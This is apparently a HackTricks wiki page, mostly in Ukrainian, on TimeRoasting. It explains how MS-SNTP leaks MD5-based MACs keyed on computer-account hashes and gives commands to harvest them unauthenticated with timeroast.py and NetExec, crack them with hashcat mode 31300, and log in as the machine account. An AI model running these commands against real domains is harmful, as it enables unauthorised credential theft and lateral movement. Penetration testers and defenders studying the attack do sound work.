# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting експлуатує застаріле розширення автентифікації MS-SNTP. У MS-SNTP клієнт може надіслати 68-байтовий запит, який вбудовує будь-який RID облікового запису комп'ютера; контролер домену використовує NTLM-хеш (MD4) облікового запису комп'ютера як ключ для обчислення MAC для відповіді і повертає його. Зловмисники можуть збирати ці MS-SNTP MAC без автентифікації та ламати їх офлайн (Hashcat mode 31300), щоб відновити паролі облікових записів комп'ютерів.

Див. розділ 3.1.5.1 "Authentication Request Behavior" та 4 "Protocol Examples" в офіційній специфікації MS-SNTP для деталей.
![](../../images/Pasted%20image%2020250709114508.png)
Коли елемент ExtendedAuthenticatorSupported ADM має значення false, клієнт надсилає 68-байтовий запит і вбудовує RID у найменш значущі 31 біт підполя Key Identifier аутентифікатора.

> If the ExtendedAuthenticatorSupported ADM element is false, the client MUST construct a Client NTP Request message. The Client NTP Request message length is 68 bytes. The client sets the Authenticator field of the Client NTP Request message as described in section 2.2.1, writing the least significant 31 bits of the RID value into the least significant 31 bits of the Key Identifier subfield of the authenticator, and then writing the Key Selector value into the most significant bit of the Key Identifier subfield.

From section 4 (Protocol Examples):

> After receiving the request, the server verifies that the received message size is 68 bytes. Assuming that the received message size is 68 bytes, the server extracts the RID from the received message. The server uses it to call the NetrLogonComputeServerDigest method (as specified in [MS-NRPC] section 3.5.4.8.2) to compute the crypto-checksums and select the crypto-checksum based on the most significant bit of the Key Identifier subfield from the received message, as specified in section 3.2.5. The server then sends a response to the client, setting the Key Identifier field to 0 and the Crypto-Checksum field to the computed crypto-checksum.

The crypto-checksum is MD5-based (see 3.2.5.1.1) and can be cracked offline, enabling the roasting attack.

## Як атакувати

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - скрипти Timeroasting від Tom Tervoort
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Практична атака (unauth) з NetExec + Hashcat

- NetExec може перерахувати та зібрати MS-SNTP MACs для computer RIDs unauthenticated та вивести $sntp-ms$ hashes готові до cracking:
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Зламати офлайн за допомогою Hashcat mode 31300 (MS-SNTP MAC):
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Відновлений відкритий текст відповідає паролю облікового запису комп'ютера. Спробуйте використати його безпосередньо як machine account за допомогою Kerberos (-k), коли NTLM вимкнено:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Практичні поради
- Переконайтеся в точній синхронізації часу перед Kerberos: `sudo ntpdate <dc_fqdn>`
- За потреби згенеруйте krb5.conf для AD realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Відображайте RIDs у principals пізніше через LDAP/BloodHound, коли отримаєте будь-який authenticated foothold.

## Посилання

- [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [NetExec – official docs](https://www.netexec.wiki/)
- [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
